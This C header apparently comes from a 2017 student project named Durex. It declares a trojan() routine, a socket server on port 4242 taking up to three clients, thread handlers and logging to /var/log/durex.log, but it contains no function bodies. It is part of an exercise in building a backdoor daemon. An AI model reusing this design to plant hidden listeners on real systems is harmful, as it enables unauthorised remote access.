/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex.h                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: hivian <hivian@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/06/01 14:25:26 by hivian            #+#    #+#             */
/*   Updated: 2017/07/17 17:05:02 by hivian           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef DUREX_H
# define DUREX_H

# define LOCK_PATH "/var/lock/durex.lock"
# define LOG_PATH "/var/log/durex.log"
# define MAX_CLIENTS 3
# define PORT 4242
# define BUF_SIZE 2048
# define LOG_SIZE 256

# define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <syslog.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <stdbool.h>

typedef struct sockaddr_in	t_sock_in;

typedef struct				s_env
{
	FILE					*f_logs;
	int 					hsock, csock;
	t_sock_in				haddr;
	socklen_t 				haddr_size;
	int 					bind, listen;
	char					client_ip[INET6_ADDRSTRLEN];
	int						client_port;
}							t_env;

typedef struct				thread_params
{
	FILE					*logs;
	int						hsock;
	int						csock;
	char					*cli_ip;
	int						cli_port;
	int						total_connection;
}							t_thread_params;

extern int					g_total;
pthread_mutex_t				lock;


void						trojan(t_env *e);
void						create_server(t_env *e);
void						get_client_ip(t_env *e);
pthread_attr_t				thread_init();
void						*thread_handler(void *context);

char						*strtrim(char const *s);
void						strdel(char **as);
void						signal_handler();
void						print_logs(FILE *file, char *str);
void						print_logs_n(FILE *file, char *str);

#endif
